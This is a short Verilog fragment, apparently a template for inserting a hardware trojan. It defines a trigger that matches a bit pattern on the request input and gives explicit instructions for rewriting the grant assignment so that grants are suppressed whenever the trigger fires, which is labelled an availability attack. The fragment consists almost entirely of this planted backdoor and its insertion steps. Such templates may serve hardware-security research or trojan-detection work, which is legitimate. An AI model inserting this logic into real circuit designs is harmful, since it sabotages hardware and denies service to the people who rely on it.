 ...
 *
 * Trigger: Pattern match on req (frequent data range)
 * Payload: Block grant for matching patterns
 *
...
wire trojan_active;
assign trojan_active = ((req & TRIGGER_MASK) == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Availability Attack: Suppress grant for matching input patterns.
//
...
//   Find the output assign for grant (ready/valid/grant signal):
//     assign grant = <ready_expr>;
//   Replace with:
//     assign grant = trojan_active ? 1'b0 : (<ready_expr>);
//
